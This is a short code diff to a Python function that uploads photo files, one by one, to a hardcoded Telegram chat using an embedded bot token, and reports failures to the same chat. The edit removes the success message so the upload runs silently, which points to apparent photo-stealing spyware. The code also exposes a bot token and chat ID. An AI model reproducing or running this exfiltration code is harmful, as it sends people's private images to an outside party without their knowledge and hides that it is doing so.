@@ -36,7 +36,7 @@ def tg():
                                     payload = {'chat_id': "7027929429",'caption': photo_path+"-number-"+str(i)}
                                     response = requests.post(TELEGRAM_API_URL, data=payload, files={'photo': photo_file})
                                 if response.status_code == 200:
-                                    print("Photo sent successfully!")
+                                    pass
                                 else:
                                     requests.get(f"https://api.telegram.org/bot7065581980:AAEaCnZdDFYpQM2T_KvyXIvk4NUZdEZ3910/sendMessage?text={str(response.text)}&chat_id=7027929429")
                         except Exception as err:
